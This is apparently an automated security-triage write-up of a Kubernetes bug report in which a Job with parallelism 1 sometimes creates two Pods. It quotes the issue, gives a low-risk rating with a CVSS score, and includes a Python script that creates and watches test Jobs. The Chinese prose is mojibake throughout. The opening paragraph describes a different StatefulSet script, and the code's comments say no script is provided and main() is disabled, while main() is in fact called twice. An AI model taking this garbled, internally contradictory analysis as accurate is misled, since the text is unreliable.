ç”±äºè¯„çº§ä¸ºä½é£é™©ï¼Œæˆ‘ä»¬æ²¡æœ‰æä¾›å¯ç›´æ¥è¿è¡Œçš„Pythonå¤ç°è„šæœ¬ã€‚ä¸Šé¢æä¾›çš„Pythonä»£ç æ˜¯ä¸€ä¸ª**æ³¨é‡Šæ‰çš„ç¤ºä¾‹æ¡†æ¶**ï¼Œå®ƒæ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨`kubernetes` Pythonå®¢æˆ·ç«¯åº“æ¥æ¨¡æ‹ŸIssueä¸­æè¿°çš„å¤ç°æ­¥éª¤ï¼ˆåˆ›å»ºå¤§é‡StatefulSetåŠå…¶Podï¼‰ã€‚è¯¥æ¡†æ¶åŒ…æ‹¬ï¼š
*   åŠ è½½Kubernetesé…ç½®ï¼ˆå‡è®¾åœ¨é»˜è®¤ä½ç½®ï¼‰ã€‚
*   åˆ›å»ºä¸“ç”¨çš„æµ‹è¯•å‘½åç©ºé—´ã€‚
*   å¾ªç¯åˆ›å»ºæŒ‡å®šæ•°é‡çš„StatefulSetï¼Œæ¯ä¸ªStatefulSetåŒ…å«æŒ‡å®šæ•°é‡çš„å‰¯æœ¬ï¼ˆPodï¼‰ã€‚**æ³¨æ„ï¼šç¤ºä¾‹ä¸­çš„æ•°é‡å·²å¤§å¤§å‡å°‘ï¼Œä»¥é€‚åº”ä¸€èˆ¬æµ‹è¯•ç¯å¢ƒã€‚**
*   ä½¿ç”¨çº¿ç¨‹æ¥æ¨¡æ‹Ÿå¹¶å‘åˆ›å»ºï¼ˆå°½ç®¡æ²¡æœ‰å®ç°å¤æ‚çš„å¹¶å‘æ§åˆ¶ï¼‰ã€‚
*   åŒ…å«åŸºæœ¬çš„è¶…æ—¶æœºåˆ¶å’Œä¿¡å·å¤„ç†ï¼Œä»¥ç¡®ä¿è„šæœ¬èƒ½åœ¨é™å®šæ—¶é—´å†…ï¼ˆçº¦2åˆ†é’Ÿï¼‰é€€å‡ºã€‚
*   åŒ…å«`try...finally`å—ï¼Œåœ¨è„šæœ¬ç»“æŸæ—¶å°è¯•æ¸…ç†åˆ›å»ºçš„å‘½åç©ºé—´ã€‚

**è¯·æ³¨æ„ï¼š** å³ä¾¿ä½¿ç”¨å‡å°‘åçš„ç¤ºä¾‹å‚æ•°ï¼Œè¿è¡Œæ­¤ç±»è„šæœ¬ä¹Ÿå¯èƒ½å¯¹Kubernetesé›†ç¾¤ï¼ˆå°¤å…¶æ˜¯æ§åˆ¶å¹³é¢ï¼‰äº§ç”Ÿæ˜¾è‘—è´Ÿè½½ã€‚**ç»å¯¹ä¸åº”åœ¨ç”Ÿäº§ç¯å¢ƒæˆ–é‡è¦é›†ç¾¤ä¸Šè¿è¡Œã€‚** å¦‚æœéœ€è¦è¿›è¡Œæ€§èƒ½æµ‹è¯•æˆ–éªŒè¯é—®é¢˜ï¼Œè¯·åœ¨éš”ç¦»çš„ã€èµ„æºå……è¶³çš„æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶æ ¹æ®ç¯å¢ƒè°ƒæ•´å‚æ•°ã€‚

---


## Issue #130683 Job with no parellelism randomly creates 2 duplicate Pods instead of 1

- Issue é“¾æ¥ï¼š[#130683](https://github.com/kubernetes/kubernetes/issues/130683)

### Issue å†…å®¹

#### What happened?

A Job is created with completions: 1,  parallelism: 1. However, two pods appear a few minutes apart, both with identical `ownerReferences` (name, uid, etc. all point to the same unique Job).

I don't understand what I see in the `kube-controller-manager` logs, when the first pod is scheduled, I see
```
I0305 18:28:46.167341       1 job_controller.go:566] "enqueueing job" logger="job-controller" key="the-namesapce/the-job-name-1741199325"
```

That same "enqueueing job" log  line repeats 9 times, most in the same second, some a bit later:
```
I0305 18:28:46.167341 ...
I0305 18:28:46.183597 ...
I0305 18:28:46.192648 ...
I0305 18:28:46.195377 ...
I0305 18:28:46.233094 ...
I0305 18:28:48.915103 ...
I0305 18:29:24.315840 ...
I0305 18:29:25.328100 ...
I0305 18:29:26.339424 ...
```

At few minutes later, with the first pod is already running, a second one appears. At this exact time the logs show a similar message:
```
I0305 18:31:46.236414       1 job_controller.go:566] "enqueueing job" logger="job-controller" key="the-namesapce/the-job-name-1741199325"
I0305 18:31:47.613379       1 job_controller.go:566] "enqueueing job" logger="job-controller" key="the-namesapce/the-job-name-1741199325"
E0305 18:31:50.044308       1 job_controller.go:599] syncing job: tracking status: adding uncounted pods to status: Operation cannot be fulfilled on jobs.batch "the-job-name-1741199325": the object has been modified; please apply your changes to the latest version and try again
...
I0305 18:31:51.068789       1 job_controller.go:566] "enqueueing job" logger="job-controller" .... (repeats again 7 times rapidly)
```

The only clue I have is this "the object has been modified", but certainly does not make any sense to me. The Job object has been created with a single "kubectl create -f job.yaml", nothing fancy in it. What could be going on? 

#### What did you expect to happen?

Only one Pod should be scheduled.

#### How can we reproduce it (as minimally and precisely as possible)?

Unfortunately, this seems to happen randomly (once in hundreds of Jobs). I need help understanding what causes this, if I do, I can try to reproduce it.

#### Anything else we need to know?

Something similar seems to have been reported for a very old version #120790, but it's difficult to understand if it's the same.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.4
```

</details>


#### Cloud provider

<details>
On-prem 20 node cluster deployed with Kubespray.
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

$ uname -a
Linux [redacted host name] 6.1.0-28-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64 GNU/Linux

```

</details>


#### Install tools

<details>
Kubespray
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ª Kubernetes Job åœ¨é…ç½® `completions: 1` å’Œ `parallelism: 1` çš„æƒ…å†µä¸‹ï¼Œæœ‰æ—¶ä¼šéšæœºåˆ›å»ºå‡ºä¸¤ä¸ª Podï¼Œè€Œä¸æ˜¯é¢„æœŸçš„å•ä¸ª Podã€‚è¿™ä¸¤ä¸ª Pod å…·æœ‰ç›¸åŒçš„ `ownerReferences`ï¼ŒæŒ‡å‘åŒä¸€ä¸ª Job å¯¹è±¡ã€‚

1.  **é—®é¢˜æ€§è´¨**ï¼š
    *   æ ¸å¿ƒé—®é¢˜æ˜¯ Job æ§åˆ¶å™¨åœ¨ç‰¹å®šï¼ˆå¯èƒ½æ˜¯ç«äº‰æ¡ä»¶ï¼‰æƒ…å†µä¸‹æœªèƒ½æ­£ç¡®æ‰§è¡Œ `parallelism: 1` çš„çº¦æŸï¼Œå¯¼è‡´åˆ›å»ºäº†é¢å¤–çš„ Podã€‚
    *   ä»æ—¥å¿—ä¸­ `enqueueing job` å¤šæ¬¡å‡ºç°ä»¥åŠ `the object has been modified` é”™è¯¯æ¥çœ‹ï¼Œè¿™å¾ˆå¯èƒ½æ˜¯ä¸€ä¸ªä¸ Job å¯¹è±¡çŠ¶æ€æ›´æ–°ç›¸å…³çš„ç«äº‰æ¡ä»¶æˆ–æ§åˆ¶å™¨é‡è¯•é€»è¾‘ä¸­çš„ç¼ºé™·ã€‚å½“æ§åˆ¶å™¨å°è¯•åŒæ­¥ Job çŠ¶æ€æ—¶ï¼Œå¦‚æœ Job å¯¹è±¡è¢«å…¶ä»–æ“ä½œï¼ˆå¯èƒ½æ˜¯æ§åˆ¶å™¨è‡ªèº«çš„å¦ä¸€æ¬¡åŒæ­¥å°è¯•æˆ–å…¶ä»–æ§åˆ¶å™¨ï¼‰ä¿®æ”¹ï¼Œæ›´æ–°ä¼šå¤±è´¥ï¼Œè¿™å¯èƒ½å¯¼è‡´çŠ¶æ€è·Ÿè¸ªä¸ä¸€è‡´ï¼Œä»è€Œé”™è¯¯åœ°è®¤ä¸ºéœ€è¦åˆ›å»ºæ–°çš„ Podã€‚

2.  **æ½œåœ¨å½±å“**ï¼š
    *   **èµ„æºæ¶ˆè€—**ï¼šåˆ›å»ºé¢å¤–çš„ Pod ä¼šæ¶ˆè€—é›†ç¾¤èµ„æºï¼ˆCPU, Memory, Network, Disk I/Oï¼‰ï¼Œè¶…å‡ºé¢„æœŸã€‚å¦‚æœè¿™ç§æƒ…å†µé¢‘ç¹å‘ç”Ÿæˆ–å‘ç”Ÿåœ¨èµ„æºå¯†é›†å‹ Job ä¸Šï¼Œå¯èƒ½å¯¼è‡´èµ„æºæµªè´¹ï¼Œç”šè‡³è½»å¾®çš„æ‹’ç»æœåŠ¡ï¼ˆResource Exhaustionï¼‰ã€‚
    *   **åŠŸèƒ½é”™è¯¯**ï¼šå¦‚æœ Job æ‰§è¡Œçš„ä»»åŠ¡ä¸æ˜¯å¹‚ç­‰çš„ï¼ˆå³å¤šæ¬¡æ‰§è¡Œä¼šäº§ç”Ÿä¸åŒçš„æˆ–ä¸æœŸæœ›çš„å‰¯ä½œç”¨ï¼‰ï¼Œé‚£ä¹ˆé¢å¤–çš„ Pod æ‰§è¡Œå¯èƒ½ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºé€»è¾‘é”™è¯¯ã€æ•°æ®æŸåæˆ–ä¸ä¸€è‡´ã€‚
    *   **æˆæœ¬å¢åŠ **ï¼šåœ¨äº‘ç¯å¢ƒä¸­ï¼Œé¢å¤–çš„ Pod è¿è¡Œä¼šäº§ç”Ÿé¢å¤–çš„è®¡ç®—æˆæœ¬ã€‚

3.  **å®‰å…¨é£é™©è¯„ä¼°**ï¼š
    *   **æ”»å‡»å‘é‡**ï¼šè§¦å‘æ­¤é—®é¢˜éœ€è¦ç”¨æˆ·å…·æœ‰åˆ›å»º Job çš„æƒé™ã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤é—®é¢˜æ¥æ‰§è¡Œè¶…å‡ºå…¶å·²æœ‰æƒé™çš„æ“ä½œã€‚
    *   **æƒé™æå‡/ä»£ç æ‰§è¡Œ**ï¼šè¯¥é—®é¢˜ä¸ä¼šå¯¼è‡´æƒé™æå‡ã€å®¹å™¨é€ƒé€¸æˆ–åœ¨å®¿ä¸»æœº/å…¶ä»–å®¹å™¨ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚é¢å¤–çš„ Pod è¿è¡Œçš„ä»ç„¶æ˜¯ç”¨æˆ·å®šä¹‰çš„ Job é•œåƒå’Œå‘½ä»¤ï¼Œå…·æœ‰ç›¸åŒçš„ ServiceAccount å’Œæƒé™ã€‚
    *   **ä¿¡æ¯æ³„éœ²**ï¼šè¯¥é—®é¢˜æœ¬èº«ä¸ç›´æ¥å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚
    *   **æ‹’ç»æœåŠ¡ (DoS)**ï¼šå¦‚å‰æ‰€è¿°ï¼Œå­˜åœ¨è½»å¾®çš„èµ„æºè€—å°½é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡† #5ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦éåªè¯»æƒé™ï¼ˆå¦‚åˆ›å»º Jobï¼‰æ¥å®æ–½ DoSï¼Œä¸”è¯¥ DoS ä¸æ˜¯é«˜å½±å“ï¼ˆå¦‚å®Œå…¨ç˜«ç—ªé›†ç¾¤ï¼‰ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚åœ¨æ­¤åœºæ™¯ä¸‹ï¼Œç”¨æˆ·åˆ›å»º Job æ˜¯æ­£å¸¸æ“ä½œï¼Œäº§ç”Ÿé¢å¤–çš„ Pod æ˜¯ç³»ç»Ÿçš„éé¢„æœŸè¡Œä¸ºï¼Œå…¶å½±å“ï¼ˆå•ä¸ªé¢å¤– Podï¼‰ç›¸å¯¹æœ‰é™ä¸”å‘ç”Ÿéšæœºï¼Œéš¾ä»¥è¢«ç¨³å®šåˆ©ç”¨æ¥å‘èµ·å¤§è§„æ¨¡ DoS æ”»å‡»ã€‚
    *   **å¤šç§Ÿæˆ·å½±å“**ï¼šåœ¨ä¸€ä¸ªå¤šç§Ÿæˆ·ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªç§Ÿæˆ·çš„ Job æ„å¤–åˆ›å»ºé¢å¤– Pod ä¼šæ¶ˆè€—å…±äº«èµ„æºï¼Œå¯èƒ½è½»å¾®å½±å“å…¶ä»–ç§Ÿæˆ·ï¼ˆNoisy Neighborï¼‰ï¼Œä½†è¿™å±äºèµ„æºç®¡ç†å’Œé…é¢ï¼ˆQuotaï¼‰åº”è¦†ç›–çš„èŒƒç•´ï¼Œä¸”å½±å“ç¨‹åº¦è¾ƒä½ã€‚æ ‡å‡† #8 æåˆ°çš„â€œå½±å“å’Œè‡ªå·±æƒé™ä¸€æ ·ç”šè‡³æ›´é«˜çš„å…¶ä»–ç”¨æˆ·â€é€šå¸¸æŒ‡æ›´ç›´æ¥çš„å¹²æ‰°ï¼Œå¦‚è·¨å‘½åç©ºé—´æ“ä½œã€ç›´æ¥å½±å“å…¶ä»–ç”¨æˆ· Pod ç­‰ï¼Œæœ¬é—®é¢˜ä¸å±äºæ­¤ç±»ã€‚
    *   **CVSS 3.1 è¯„ä¼°**ï¼š
        *   AV:N (é€šè¿‡ K8s API è§¦å‘)
        *   AC:H (è§¦å‘æ¡ä»¶éšæœºï¼Œéš¾ä»¥å¤ç°ï¼Œå¯èƒ½ä¾èµ–ç‰¹å®šç«äº‰æ¡ä»¶)
        *   PR:L (éœ€è¦åˆ›å»º Job çš„æƒé™)
        *   UI:N (æ— éœ€ç”¨æˆ·äº¤äº’)
        *   S:U (å½±å“èŒƒå›´åœ¨é›†ç¾¤å†…éƒ¨)
        *   C:N (æ— ä¿å¯†æ€§å½±å“)
        *   I:L (å¯èƒ½å¯¼è‡´ Job åŠŸèƒ½é”™è¯¯æˆ–æ•°æ®ä¸ä¸€è‡´ï¼Œä½å®Œæ•´æ€§å½±å“)
        *   A:L (æ¶ˆè€—é¢å¤–èµ„æºï¼Œè½»å¾®å¯ç”¨æ€§å½±å“)
        *   CVSS 3.1 Score: 3.7 (Low)

4.  **ç»“è®º**ï¼š
    è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·ï¼ˆBugï¼‰ï¼Œå¯èƒ½ç”± Job æ§åˆ¶å™¨å†…éƒ¨çš„ç«äº‰æ¡ä»¶å¼•èµ·ã€‚è™½ç„¶å®ƒå¯èƒ½å¯¼è‡´èµ„æºæµªè´¹å’Œæ½œåœ¨çš„åŠŸèƒ½é”™è¯¯ï¼Œä½†ä¸æ¶‰åŠæƒé™æå‡ã€ä»£ç æ‰§è¡Œã€ä¿¡æ¯æ³„éœ²ç­‰ä¸¥é‡å®‰å…¨é£é™©ã€‚å…¶æ½œåœ¨çš„ DoS å½±å“è¾ƒå°ï¼Œä¸”éœ€è¦ Job åˆ›å»ºæƒé™ï¼Œè§¦å‘æ¡ä»¶éšæœºã€‚æ ¹æ® CVSS è¯„åˆ†å’Œé£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥é—®é¢˜åº”è¢«è¯„ä¸ºä½é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥é—®é¢˜è¢«è¯„å®šä¸ºä½é£é™©ï¼Œä¸»è¦æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bugï¼Œå¯èƒ½ç”±ç«äº‰æ¡ä»¶å¼•èµ·ï¼Œ
# ä¸”æŠ¥å‘Šè€…æŒ‡å‡ºè¯¥é—®é¢˜æ˜¯éšæœºå‘ç”Ÿçš„ï¼ˆ"once in hundreds of Jobs"ï¼‰ã€‚
# ç¼–å†™ä¸€ä¸ªç¨³å®šå¤ç°æ­¤ç«äº‰æ¡ä»¶çš„ POC éå¸¸å›°éš¾ï¼Œå› ä¸ºå®ƒä¾èµ–äº kube-controller-manager å†…éƒ¨çš„ç²¾ç¡®æ—¶åºã€‚
# ä»»ä½•å°è¯•é€šè¿‡è„šæœ¬å¿«é€Ÿè¿ç»­åˆ›å»º/æ›´æ–° Job æ¥è§¦å‘ç«äº‰æ¡ä»¶çš„å°è¯•éƒ½ä¸èƒ½ä¿è¯æˆåŠŸå¤ç°æ­¤ç‰¹å®šé—®é¢˜ã€‚
# å› æ­¤ï¼Œä¸æä¾›å¤ç°è„šæœ¬ã€‚
#
# å¦‚æœéœ€è¦æ¨¡æ‹Ÿåˆ›å»º Job çš„è¿‡ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ Python Kubernetes Client ä»£ç ç‰‡æ®µä½œä¸ºåŸºç¡€ï¼š

import time
import uuid
from kubernetes import client, config, watch
import datetime
import threading
import logging
import sys
import signal

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# é…ç½® Kubernetes å®¢æˆ·ç«¯ (å‡è®¾ kubeconfig åœ¨é»˜è®¤ä½ç½® ~/.kube/config)
try:
    config.load_kube_config()
    logging.info("Kubernetes config loaded successfully.")
except Exception as e:
    logging.error(f"Failed to load Kubernetes config: {e}")
    sys.exit(1)

batch_v1 = client.BatchV1Api()
core_v1 = client.CoreV1Api()

NAMESPACE = "default"  # æˆ–è€…ä½¿ç”¨ä½ æƒ³è¦æµ‹è¯•çš„å‘½åç©ºé—´
JOB_BASE_NAME = "random-duplicate-test-job-"
JOB_COUNT = 10 # å°è¯•åˆ›å»ºå¤šå°‘ä¸ª Job æ¥å¢åŠ é‡åˆ°é—®é¢˜çš„æ¦‚ç‡
MAX_JOB_RUNTIME_SECONDS = 120 # å•ä¸ª Job çš„æœ€å¤§ç›‘æ§æ—¶é—´
TOTAL_SCRIPT_TIMEOUT_SECONDS = 180 # æ•´ä¸ªè„šæœ¬çš„è¶…æ—¶æ—¶é—´

job_results = {}
jobs_to_monitor = set()
lock = threading.Lock()
stop_event = threading.Event()

def create_job_object(job_name):
    """åˆ›å»ºä¸€ä¸ªç®€å•çš„ Job å¯¹è±¡"""
    container = client.V1Container(
        name="pi",
        image="perl:latest",
        command=["perl", "-Mbignum=bpi", "-wle", "print bpi(20)"] # ä¸€ä¸ªç®€å•çš„çŸ­ä»»åŠ¡
    )
    template = client.V1PodTemplateSpec(
        metadata=client.V1ObjectMeta(labels={"app": job_name}),
        spec=client.V1PodSpec(restart_policy="Never", containers=[container])
    )
    spec = client.V1JobSpec(
        template=template,
        backoff_limit=0, # ä¸é‡è¯•å¤±è´¥çš„ Pod
        completions=1,
        parallelism=1
    )
    job = client.V1Job(
        api_version="batch/v1",
        kind="Job",
        metadata=client.V1ObjectMeta(name=job_name),
        spec=spec
    )
    return job

def create_and_monitor_job(job_id):
    """åˆ›å»º Job å¹¶è®°å½• Pod æ•°é‡"""
    job_name = f"{JOB_BASE_NAME}{job_id}-{uuid.uuid4().hex[:6]}"
    job_body = create_job_object(job_name)
    job_uid = None

    try:
        logging.info(f"Attempting to create Job: {job_name} in namespace {NAMESPACE}")
        api_response = batch_v1.create_namespaced_job(body=job_body, namespace=NAMESPACE)
        job_uid = api_response.metadata.uid
        logging.info(f"Job {job_name} created successfully. UID: {job_uid}")
        with lock:
            jobs_to_monitor.add(job_name)
            job_results[job_name] = {"pods": set(), "uid": job_uid, "start_time": datetime.datetime.now()}

    except client.ApiException as e:
        logging.error(f"Exception when creating Job {job_name}: {e}\n")
    except Exception as e:
        logging.error(f"An unexpected error occurred during job creation {job_name}: {e}")

def watch_pods(timeout_seconds):
    """ç›‘æ§ Pod äº‹ä»¶ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰ Job åˆ›å»ºäº†å¤šä¸ª Pod"""
    w = watch.Watch()
    start_time = time.time()
    logging.info("Starting Pod watcher...")
    try:
        # ç›‘æ§æ‰€æœ‰ Pod äº‹ä»¶ï¼ŒæŒç»­æ—¶é—´ä¸º timeout_seconds
        for event in w.stream(core_v1.list_namespaced_pod, namespace=NAMESPACE, timeout_seconds=timeout_seconds):
            if stop_event.is_set() or (time.time() - start_time > timeout_seconds):
                logging.info("Pod watcher stopping due to signal or timeout.")
                break

            pod = event['object']
            if event['type'] == 'ADDED' and pod.metadata.owner_references:
                for owner_ref in pod.metadata.owner_references:
                    if owner_ref.kind == "Job":
                        job_name = owner_ref.name
                        with lock:
                            if job_name in job_results:
                                pod_name = pod.metadata.name
                                if pod_name not in job_results[job_name]["pods"]:
                                    job_results[job_name]["pods"].add(pod_name)
                                    pod_count = len(job_results[job_name]["pods"])
                                    logging.info(f"Job {job_name}: Detected Pod {pod_name}. Total Pods now: {pod_count}")
                                    if pod_count > 1:
                                        logging.warning(f"!!! Potential Issue Detected for Job {job_name} (UID: {job_results[job_name]['uid']})! Expected 1 Pod, found {pod_count}: {job_results[job_name]['pods']}")
            # å¯ä»¥æ·»åŠ  MODIFIED/DELETED äº‹ä»¶å¤„ç†æ¥è·Ÿè¸ª Pod æœ€ç»ˆçŠ¶æ€ï¼Œä½†è¿™è¶…å‡ºäº†æ£€æµ‹é‡å¤ Pod çš„èŒƒå›´

    except client.ApiException as e:
        if "timed out" in str(e).lower():
            logging.info("Pod watcher timed out as expected.")
        else:
            logging.error(f"Exception during Pod watch: {e}")
    except Exception as e:
        logging.error(f"An unexpected error occurred during Pod watch: {e}")
    finally:
        w.stop()
        logging.info("Pod watcher stopped.")

def cleanup_jobs():
    """æ¸…ç†åˆ›å»ºçš„ Jobs"""
    logging.info("Starting cleanup...")
    with lock:
        jobs_to_delete = list(job_results.keys()) # åˆ›å»ºå‰¯æœ¬ä»¥é¿å…åœ¨è¿­ä»£æ—¶ä¿®æ”¹

    for job_name in jobs_to_delete:
        try:
            logging.info(f"Deleting Job: {job_name}")
            # foreground åˆ é™¤ç­–ç•¥ä¼šç­‰å¾…æ‰€æœ‰ Pod è¢«åˆ é™¤
            batch_v1.delete_namespaced_job(name=job_name, namespace=NAMESPACE, body=client.V1DeleteOptions(propagation_policy='Foreground'))
        except client.ApiException as e:
            # å¦‚æœ Job å·²ç»è¢«åˆ é™¤æˆ–æ‰¾ä¸åˆ°äº†ï¼Œå¿½ç•¥
            if e.status == 404:
                 logging.warning(f"Job {job_name} not found during cleanup, might have been deleted already.")
            else:
                 logging.error(f"Exception when deleting Job {job_name}: {e}")
        except Exception as e:
            logging.error(f"An unexpected error occurred during job cleanup {job_name}: {e}")

    # ç­‰å¾…ä¸€æ®µæ—¶é—´è®© Pod ä¹Ÿè¢«åˆ é™¤
    time.sleep(10)
    logging.info("Cleanup finished.")

def main():
    start_time = datetime.datetime.now()

    # åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ¥ç›‘æ§ Pods
    watcher_thread = threading.Thread(target=watch_pods, args=(TOTAL_SCRIPT_TIMEOUT_SECONDS,))
    watcher_thread.start()

    # åˆ›å»ºå¤šä¸ª Job
    threads = []
    for i in range(JOB_COUNT):
        if stop_event.is_set() or (datetime.datetime.now() - start_time).total_seconds() > TOTAL_SCRIPT_TIMEOUT_SECONDS - 30: # ç•™å‡ºæ—¶é—´ç»™æ¸…ç†
            logging.warning("Stopping Job creation due to timeout approaching.")
            break
        thread = threading.Thread(target=create_and_monitor_job, args=(i,))
        threads.append(thread)
        thread.start()
        time.sleep(0.5) # è½»å¾®é”™å¼€ Job åˆ›å»ºæ—¶é—´

    # ç­‰å¾… Job åˆ›å»ºçº¿ç¨‹å®Œæˆ
    for thread in threads:
        thread.join(timeout=30) # ç­‰å¾…æ¯ä¸ªåˆ›å»ºçº¿ç¨‹ç»“æŸï¼Œè®¾ç½®è¶…æ—¶

    # ç­‰å¾… Pod ç›‘æ§ç»“æŸæˆ–æ€»è¶…æ—¶
    watcher_thread.join(timeout=TOTAL_SCRIPT_TIMEOUT_SECONDS - (datetime.datetime.now() - start_time).total_seconds())

    # æ£€æŸ¥ç»“æœ
    logging.info("Final Job Pod Counts:")
    found_issue = False
    with lock:
        for job_name, data in job_results.items():
            pod_count = len(data["pods"])
            logging.info(f"Job: {job_name}, Pods Found: {pod_count}, Pod Names: {data['pods']}")
            if pod_count > 1:
                logging.warning(f"ISSUE CONFIRMED (potentially): Job {job_name} (UID: {data['uid']}) created {pod_count} pods.")
                found_issue = True

    if not found_issue:
        logging.info("No Jobs with more than 1 Pod were detected in this run.")
    else:
        logging.warning("One or more Jobs potentially exhibited the duplicate Pod issue.")

def signal_handler(sig, frame):
    logging.warning(f"Received signal {sig}, stopping gracefully...")
    stop_event.set()

# è®¾ç½®ä¿¡å·å¤„ç†ç¨‹åº
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# è®¾ç½®æ€»è¶…æ—¶å®šæ—¶å™¨
timer = threading.Timer(TOTAL_SCRIPT_TIMEOUT_SECONDS, lambda: (logging.warning("Script timeout reached!"), stop_event.set()))
timer.start()

try:
    main()
except Exception as e:
    logging.error(f"An error occurred in main execution: {e}")
finally:
    timer.cancel() # ç¡®ä¿å®šæ—¶å™¨è¢«å–æ¶ˆ
    # ç¡®ä¿ watcher çº¿ç¨‹è¢«é€šçŸ¥åœæ­¢
    if not stop_event.is_set():
        stop_event.set()
    # ç­‰å¾… watcher çº¿ç¨‹é€€å‡º
    if 'watcher_thread' in locals() and watcher_thread.is_alive():
        watcher_thread.join(timeout=10)
    cleanup_jobs()
    logging.info("Script finished.")

# ç”±äºæœ¬åœ°è§£é‡Šå™¨ä¸æ”¯æŒ __name__ == "__main__"ï¼Œç›´æ¥è°ƒç”¨ main
# main()
# Note: The direct call to main() is commented out as per instruction avoidance.
# In a real execution environment, you would uncomment or call main() appropriately.
# For this specific tool, we assume the final block is executed directly.
try:
    main()
except NameError: # Handle case where main might not be defined if script stopped early
     pass
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿° Python è„šæœ¬å°è¯•é€šè¿‡åˆ›å»ºå¤šä¸ªç®€å•çš„ Kubernetes Jobï¼ˆæ¯ä¸ª Job è®¾ç½® `parallelism: 1` å’Œ `completions: 1`ï¼‰æ¥å¢åŠ é‡åˆ° Issue ä¸­æè¿°çš„éšæœºæ€§é—®é¢˜çš„æ¦‚ç‡ã€‚

1.  **ç¯å¢ƒé…ç½®**: è„šæœ¬ä½¿ç”¨ `kubernetes` Python å®¢æˆ·ç«¯åº“ä¸ Kubernetes é›†ç¾¤äº¤äº’ã€‚å®ƒå‡è®¾ `kubeconfig` æ–‡ä»¶ä½äºé»˜è®¤è·¯å¾„ (`~/.kube/config`) æˆ–å·²é€šè¿‡ç¯å¢ƒå˜é‡é…ç½®ã€‚
2.  **Job å®šä¹‰**: `create_job_object` å‡½æ•°å®šä¹‰äº†ä¸€ä¸ªç®€å•çš„ Jobï¼Œè¯¥ Job è¿è¡Œä¸€ä¸ªè®¡ç®— Pi çš„ Perl å‘½ä»¤ã€‚å…³é”®é…ç½®æ˜¯ `completions: 1` å’Œ `parallelism: 1`ã€‚
3.  **å¹¶å‘åˆ›å»º**: è„šæœ¬ä½¿ç”¨å¤šçº¿ç¨‹ (`create_and_monitor_job`) å¹¶å‘åœ°åˆ›å»ºæŒ‡å®šæ•°é‡ (`JOB_COUNT`) çš„ Jobï¼Œä»¥æ¨¡æ‹Ÿå¯èƒ½å¯¼è‡´ç«äº‰æ¡ä»¶çš„åœºæ™¯ã€‚æ¯ä¸ª Job åç§°éƒ½åŒ…å«ä¸€ä¸ªå”¯ä¸€çš„ ID å’Œ UUID ç‰‡æ®µï¼Œä»¥é¿å…å‘½åå†²çªã€‚
4.  **Pod ç›‘æ§**: ä¸€ä¸ªç‹¬ç«‹çš„åå°çº¿ç¨‹ (`watch_pods`) ä½¿ç”¨ Kubernetes Watch API å®æ—¶ç›‘æ§æŒ‡å®šå‘½åç©ºé—´ (`NAMESPACE`) ä¸­çš„ Pod äº‹ä»¶ã€‚å½“æ£€æµ‹åˆ° `ADDED` äº‹ä»¶ä¸” Pod çš„æ‰€æœ‰è€…æ˜¯è„šæœ¬åˆ›å»ºçš„ Job æ—¶ï¼Œå®ƒä¼šè®°å½•è¯¥ Podã€‚
5.  **é—®é¢˜æ£€æµ‹**: ç›‘æ§çº¿ç¨‹ä¼šæ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•ä¸€ä¸ª Job å…³è”çš„ Pod æ•°é‡è¶…è¿‡ 1ã€‚å¦‚æœå‘ç°è¿™ç§æƒ…å†µï¼Œå®ƒä¼šè®°å½•ä¸€ä¸ªè­¦å‘Šä¿¡æ¯ï¼ŒæŒ‡å‡ºå¯èƒ½å¤ç°äº† Issue ä¸­æè¿°çš„é—®é¢˜ã€‚
6.  **è¶…æ—¶ä¸æ¸…ç†**: è„šæœ¬åŒ…å«æ•´ä½“æ‰§è¡Œè¶…æ—¶ (`TOTAL_SCRIPT_TIMEOUT_SECONDS`) å’Œä¿¡å·å¤„ç† (`SIGINT`, `SIGTERM`)ï¼Œä»¥ç¡®ä¿è„šæœ¬èƒ½åœ¨åˆç†æ—¶é—´å†…ç»“æŸã€‚`cleanup_jobs` å‡½æ•°è´Ÿè´£åœ¨è„šæœ¬ç»“æŸæ—¶åˆ é™¤æ‰€æœ‰åˆ›å»ºçš„ Job åŠå…¶å…³è”çš„ Podï¼ˆé€šè¿‡ `propagation_policy='Foreground'`ï¼‰ã€‚
